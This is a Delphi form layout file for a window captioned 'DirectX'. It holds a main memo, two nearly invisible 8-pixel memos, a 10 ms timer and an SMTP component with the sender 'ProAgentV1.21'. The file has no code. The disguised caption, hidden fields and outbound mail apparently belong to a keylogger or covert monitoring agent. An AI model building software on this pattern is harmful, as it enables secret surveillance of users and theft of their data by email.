object Form1: TForm1
  Left = 340
  Top = 310
  Width = 543
  Height = 349
  Caption = 'DirectX'
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  PixelsPerInch = 96
  TextHeight = 13
  object Memo1: TMemo
    Left = 0
    Top = 0
    Width = 535
    Height = 299
    Align = alClient
    Font.Charset = ANSI_CHARSET
    Font.Color = clWindowText
    Font.Height = -11
    Font.Name = 'Fixedsys'
    Font.Style = []
    ParentFont = False
    ScrollBars = ssBoth
    TabOrder = 0
  end
  object Memo2: TMemo
    Left = 0
    Top = 299
    Width = 535
    Height = 8
    Align = alBottom
    ScrollBars = ssVertical
    TabOrder = 1
  end
  object Memo3: TMemo
    Left = 0
    Top = 307
    Width = 535
    Height = 8
    Align = alBottom
    ScrollBars = ssBoth
    TabOrder = 2
  end
  object Timer1: TTimer
    Interval = 10
    OnTimer = Timer1Timer
    Left = 48
    Top = 16
  end
  object NMSMTP1: TipwSMTP
    FirewallPort = 80
    From = 'ProAgentV1.21'
    Left = 16
    Top = 16
  end
end
